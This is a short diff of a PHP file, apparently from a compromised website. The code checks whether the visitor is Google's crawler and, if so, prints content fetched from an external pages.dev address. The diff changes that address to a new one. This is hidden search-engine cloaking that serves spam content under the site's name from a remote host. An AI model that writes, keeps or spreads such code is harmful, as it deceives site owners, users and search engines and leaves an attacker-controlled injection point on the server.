@@ -19,7 +19,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
-    echo file_get_contents("https://thortukangbangunan.pages.dev/index.txt");
+    echo file_get_contents("https://superflashjualbatagor.pages.dev/index.txt");
     exit;
 }
 ?>
